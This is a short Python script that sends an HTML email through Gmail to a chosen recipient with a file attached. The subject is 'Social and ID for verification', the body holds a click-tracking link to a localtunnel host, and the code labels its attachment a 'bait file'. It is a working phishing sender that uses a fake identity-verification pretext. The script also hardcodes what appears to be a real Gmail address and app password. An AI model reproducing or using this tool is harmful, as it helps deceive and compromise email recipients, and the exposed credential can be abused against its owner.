import smtplib
import ssl
import os
import argparse
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from email.utils import formatdate

# 🔐 Gmail credentials
GMAIL_USER = "butlerrobert101@gmail.com"
GMAIL_PASS = "gsomgaonitwqnney"

# 📌 Predefined subject & HTML body
SUBJECT = "Social and ID for verification"
BODY_HTML = """
<html>
  <body>
    <p>Hello,</p>
    <p>Please find the requested documents attached.</p>
    <p>If the attachment doesn't work, you can also view it <a href="https://yourdomain.loca.lt/track/money">here</a>.</p>
    <br>
  </body>
</html>
"""

def send_email(recipient_email, attachment_path):
    if not os.path.exists(attachment_path):
        print(f"❌ File not found: {attachment_path}")
        return

    msg = MIMEMultipart()
    msg["From"] = GMAIL_USER
    msg["To"] = recipient_email
    msg["Date"] = formatdate(localtime=True)
    msg["Subject"] = SUBJECT

    msg.attach(MIMEText(BODY_HTML, "html"))

    with open(attachment_path, "rb") as file:
        part = MIMEApplication(file.read(), Name=os.path.basename(attachment_path))
        part['Content-Disposition'] = f'attachment; filename="{os.path.basename(attachment_path)}"'
        msg.attach(part)

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context()) as server:
            server.login(GMAIL_USER, GMAIL_PASS)
            server.send_message(msg)
            print("✅ Email sent successfully.")
    except Exception as e:
        print(f"❌ Failed to send email: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Send bait file to email")
    parser.add_argument("to", help="Recipient email address")
    args = parser.parse_args()

    file_path = input("📁 Enter path to the file you want to send: ").strip()
    send_email(args.to, file_path)
